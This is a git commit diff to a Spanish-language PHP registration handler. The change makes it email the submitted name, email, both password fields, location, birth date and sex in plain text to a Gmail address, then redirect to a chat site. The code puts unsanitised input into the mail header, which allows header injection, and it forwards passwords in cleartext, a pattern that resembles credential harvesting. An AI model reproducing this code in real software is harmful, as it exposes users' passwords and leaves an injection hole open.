e59ba5fc8139535e0d59b5ad5ee402582f5de055
dj calvin <laberinto692@gmail.com>
2026-05-26 23:15:09 -0400

    Update registro.php

--- registro.php
+++ registro.php
@@ -1,16 +1,23 @@
 <?php
 $nombre = $_POST['nombre'];
-$mensaje = $_POST['mensaje'];
+$email = $_POST['email'];
+$clave = $_POST['clave'];
+$clave2 = $_POST['clave2'];
+$Lugar = $_POST ['textfield'];
+$select = $_POST ['select'];
+$select2 = $_POST ['select2'];
+$select3 = $_POST ['select3'];
+$select4 = $_POST ['select4'];
 $para = 'pyasoweb@gmail.com';
 $titulo = 'ASUNTO DEL MENSAJE';
 $header = 'From: ' . $email;
-$msjCorreo = "Nombre: $nombre\n Mensaje:\n $mensaje";
+$msjCorreo = "Nombre: $nombre\n E-Mail: $email\n Clave: $clave\n Clave2: $clave2\n Lugar: $Lugar\n Año: $select\n Mes: $select2\n Dia: $select3\n Sexo: $select4";
   
 if ($_POST['submit']) {
 if (mail($para, $titulo, $msjCorreo, $header)) {
 echo "<script language='javascript'>
 alert('Mensaje enviado, muchas gracias.');
-window.location.href = 'http://tokyo-zona-zero.esy.es';
+window.location.href = 'http://www.elchat.net/htmlchat/elchat.html';
 </script>";
 } else {
 echo 'Falló el envio';
